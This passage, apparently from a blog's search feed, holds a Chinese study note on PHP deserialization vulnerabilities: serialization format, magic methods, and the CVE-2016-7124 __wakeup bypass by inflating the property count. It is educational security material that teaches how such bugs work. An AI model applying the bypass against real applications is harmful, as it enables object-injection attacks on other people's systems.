  <script id="hbeData" type="hbeData" data-hmacdigest="e7083e157921501e3bc34a366b64a8d31f975d336cc00f2bc333245eeaf8a412">f5ac9fae91cad559d5e13dc70330220c16e8d719b1b1f0c4f1b512f5c72db9b686e4ed3d42cbc58fd0fbcdd263ffd3bb753c3342b28750ba8a7581cc22d4b285d45e4a054e1b67a585313684dc207526c778d2b0378870e6dd6b0325c1006dce10c8ee278fc48506891cb799291c6229faca95c3a97a23a5284a5a0a7addbf9a8b3525024d7c4a8f4c846df8e1bd8b1eec2c1999455a1cb3eafbaa386c7827d58df44daa3029061a4c7950ea78af99f6626f10b7547a85b4e7f69b67598f1420fb27e7129615101be99c70131241138ed943d0a70ab2965055c9cf7c3495169e2b0714faad3716838be30009a52dd8d09da4dd49e03a695370f0b8ae00259142e95a38a2100cfc6f246aecfaa510ac567f4db62f90d5617263df9dac1c8bf093cde7e45ff42fe2ffe9fa33a0a1bf6bdf4c9c48ea2116f6927940ee20beec5fb03fc07f3b34e6fa39ae7b2acf80633198503bb78fea21f78c6c7aed136fe8c19e94090f97650cca1a9e30fb669aaf35af6213873398e69bd0dbd478bf00f1b93b8b37df5041c7d6de12f4ad49db2655e5570f0f617d8f004e8397266fb531d7d9d114cddaf21a802a1ffdabc7c5da009605a7ee6a0648efb5f6a0e3f74b5e512a9965ba58c78f997e346e744fd91177528da2932302f6aeb15a2dc21b910163be0b9dbdb987b7dfe9227781571a13c5a91c1d19c1db3538a73e777d133d91f03be5e95c0d419dffefcb2f10fbdd310a125fb9c895f5d0ea583156b34b3eb93722bb0fe5d65739828fbee136cf91b1f8a6b6d0adcae1dc2999aaa1dbd9329d232197b98da1460f7c747fe86a88545ea2f145968ac28541de1e1893004e713a6b79ff3bddd24df4b46cf7bde9c5d7494397e034855756dd8c2a6fca2b7d694fcb9b57f925d2aa3c7506b23fdfa0c8275aa4b34c1110ac41f6384d359f55d0c504ddd4d25ba6380ade9c9593a341f5a4e767d6807d5103877717f90be8f2b48a2612f537f1f9fd3fca2f1bd09ebb0b3d5c254c51bd1e788ca02d00ec85a0a8447535b421bf0c34a7b3bf5b59768f5f08ca6c41c15d23eca127b0450444494e653cc59b378825cfc8372ae8d9083257886f4392a2067fc31cc2c89dfdd09f833c3a063b6d1d5dd641e6e6bb53f93b77512cc63c7a38c5a9e2806a6d3c8b361987a64b3c20b60bca65d18cea8327429fae3c455374bc858de7c6037a022417b2a7442b1358db8730b2ee231dcd455948c1d28fc22aa8d9ef7becdf035d55980c989d491ed813f632b390d8c1969cb4b31d49357e21663ad4a8a5862347e7e75a7c0425a4cffbdf6492b0ef52ef244febb746fec9e57495464c48e22e01e71869ab481685768f0b290db77f0ec72e447c23e1965aa9e1249e06bcfb7016541397cd6633625a43b50fcb0b6466d38eead013e17c5fc04c296708509f2c53a9754601aff8a124c66848c3a7e999cba9caa0c38612d4203b362a6c8d5786978c10fc838f735cd6fe4694826dc6dacd47dc4d861b68d8fd4b3f62e91472f8ddecad780a3b82b1db29d87a6fd281cc57c20873e65c9e97a95a90ce2c102c65974845fc078209d432b6230b4b320d43e372f1b1f4472bd98d7a983c5a92debf30716dd1b5a669236420c59dc7bdbc6cdaf9cdbd8d2778c4e5da3de9cdc717313679a2efb9219a09b3b7f3624ce4b9f98d4c52118894b343b110fb8f48c9060dd1929e75a6f002fd9f5047b1dbc7067ba3d923c56584f443db772d420663a2ef388f5eec1a8519e3c26a847632d14cf12a9a050b21c4251c14b6c6b5cd05c22e1001b1f330b272bae5192d3e9a81e1f1989d86a2861eb43b73192122bc87998dbbb21bd9f0ae9fec19f1f7497baaa8077a0a51b88dbfa24fd4693e0c8e5417eed8eee7b00a058bcdc594e7580c6450603b001a1982bd447339326f367933ca241eb4cecec7b818b9ce6eaedeb3e45063afe52a9c1bacab655ef3539764d06c160673326ce95de3c6dee48dc3531f3296e8234902b002a806d3fcfe6789b2e3cb7afd0f20cc039ca253ada69739411a3050bdb36e13136fe7445f1615e8ebce80a49ee5b025dcaf8e23c277b03ce73135c8d51bc7d2d447de5b1679ae949d132e279bd80d98963aeeceba8748319fe1f38bdcdda54f83640935c3e1e3e6a41b0d94f5b8e3101b7f5423b98aba4ceb087463b6ffa21c04a6db17e23457a35442db0fbab1b6de96d81b9aaf06d318ef22aff3487db8b6c17631c15f8f23c0d01e90d824bd6d4af16f3f13eca075a327b21dae940fc6b4cc3a</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞原理</title>
    <url>/2022/10/25/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<center>一些漏洞的原理</center>

<span id="more"></span>

<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><a href="https://blog.csdn.net/qq_43531669/article/details/120402889">参考</a></p>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化就是将对象object、字符串string、数组array、变量，转换成具有一定格式的字符串，使其能在文件储存或传输的过程中保持稳定的格式。</p>
<p>PHP中通过 <code>serialize()</code> 函数实现</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span> = <span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$class_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class_ser</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>序列化的结果为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;Personage&quot;</span>;i:<span class="number">18</span>;s:<span class="number">6</span>:<span class="string">&quot;*sex&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;male&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O代表object，如果是数组则是i，6代表对象名长度，Person是对象名</span><br><span class="line">3是对象里面的成员变量的数量</span><br><span class="line">括号里面s代表string数据类型，如果是i则代表int数据类型；4代表属性名的长度；name即属性名</span><br><span class="line">数字不显示长度</span><br><span class="line">类里面的方法并不会序列化</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据成员变量的的修饰类型不同，在序列化中的表示方法也有所不同</span><br><span class="line">三个修饰类型分别是public、private、protected</span><br><span class="line">public，没有变化,name=&gt;4</span><br><span class="line">private，会变成 %00类名%00属性名，%00Person%00age=&gt;11</span><br><span class="line">protected，会变成 %00*%00属性名，%00*%00age=&gt;6</span><br><span class="line">%00为空白符，空字符也有长度，一个空字符长度为 1，%00 虽然不会显示，但是提交还是要加上去。</span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化就是序列化的逆过程，通过 <code>unserialize()</code> 函数实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span> = <span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$class_ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="comment">//echo $class_ser;</span></span><br><span class="line"><span class="variable">$class_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$class_ser</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$class_unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果不含类方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(Person)<span class="comment">#2 (3) &#123; </span></span><br><span class="line">	[<span class="string">&quot;name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;Tom&quot;</span> </span><br><span class="line">	[<span class="string">&quot;age&quot;</span>:<span class="string">&quot;Person&quot;</span>:<span class="keyword">private</span>]=&gt; <span class="keyword">int</span>(<span class="number">18</span>) </span><br><span class="line">	[<span class="string">&quot;sex&quot;</span>:<span class="keyword">protected</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;male&quot;</span> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="PHP魔术方法"><a href="#PHP魔术方法" class="headerlink" title="PHP魔术方法"></a>PHP魔术方法</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():构造函数，此函数会在创建一个类的实例时自动调用。</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数，此函数会在对象的所有引用都被删除或者类被销毁的时候自动调用。</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>():执行<span class="title function_ invoke__">serialize</span>()函数之前，会检查类中是否存在<span class="title function_ invoke__">_sleep</span>()方法。如果存在，该方法会先被调用。</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():执行<span class="title function_ invoke__">unserialize</span>()函数之前，会检查类中是否存在<span class="title function_ invoke__">_wakeup</span>()方法。如果存在，则会先调用<span class="title function_ invoke__">_wakeup</span>()方法，预先准备对象需要的资源。</span><br><span class="line"><span class="title function_ invoke__">__toString</span>():当一个对象被当作一个字符串使用时被调用。例如<span class="keyword">echo</span> <span class="variable">$obj</span>或者拼接字符串时；此方法必须返回一个字符串，否则会产生 E_RECOVERABLE_ERROR 级别的错误。</span><br><span class="line"><span class="title function_ invoke__">__get</span>():在读取不可访问的属性值的时候，此魔法函数会自动调用。</span><br><span class="line"><span class="title function_ invoke__">__set</span>():在给不可访问（<span class="keyword">protected</span> 或 <span class="keyword">private</span>）或不存在的属性赋值时(不常用)</span><br><span class="line"><span class="title function_ invoke__">__call</span>():在调用未定义的方法时被调用。</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>():当脚本尝试将对象调用为函数时触发(PHP≥<span class="number">5.3</span>.<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>执行的顺序（如果全部执行的话）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new obj-&gt;serialize obj-&gt;unserialize str[-&gt;str(obj)]-&gt;end</span><br><span class="line">construct-&gt;sleep-&gt;wakeup(-&gt;tostring)-&gt;destruct</span><br></pre></td></tr></table></figure>

<h2 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</span><br><span class="line">O:6:&quot;Person&quot;:3 =&gt; O:6:&quot;Person&quot;:4</span><br></pre></td></tr></table></figure>

<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>可用的类，类中有魔法函数，<code>unserialize</code>的参数用户可控。攻击者可以构造恶意的序列化字符串</p>
]]></content>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
</search>
